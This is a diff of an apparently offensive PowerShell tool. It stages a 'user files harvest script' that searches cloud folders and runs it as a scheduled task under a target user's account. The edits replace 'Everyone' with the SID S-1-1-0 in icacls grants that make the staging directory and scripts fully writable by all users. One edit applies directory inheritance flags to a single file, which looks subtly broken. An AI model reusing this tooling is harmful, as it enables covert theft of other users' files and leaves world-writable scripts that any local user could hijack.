@@ -9,7 +9,7 @@ param(
 )
 
 New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
-icacls $OutputDir /grant "Everyone:(OI)(CI)F" | Out-Null
+icacls $OutputDir /grant "*S-1-1-0:(OI)(CI)F" | Out-Null
 
 foreach ($f in @(
     "userfiles.ps1",
@@ -23,7 +23,7 @@ foreach ($f in @(
 )) {
     Remove-Item -Path "$OutputDir\$f" -Force -ErrorAction SilentlyContinue
     New-Item -Path "$OutputDir\$f" -ItemType File -Force | Out-Null
-    icacls "$OutputDir\$f" /grant "Everyone:(F)" | Out-Null
+    icacls "$OutputDir\$f" /grant "*S-1-1-0:(OI)(CI)F" | Out-Null
 }
 
 Write-Host "[*] Creating user files harvest script..." -ForegroundColor Cyan
@@ -341,7 +341,7 @@ foreach (`$cloudPath in @(
     }
 }
 "@ | Set-Content -Path "$OutputDir\userfiles.ps1" -Encoding ASCII
-icacls "$OutputDir\userfiles.ps1" /grant "Everyone:(F)" | Out-Null
+icacls "$OutputDir\userfiles.ps1" /grant "*S-1-1-0:(F)" | Out-Null
 
 Write-Host "[*] Creating and starting scheduled task as $TargetUser..." -ForegroundColor Cyan
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
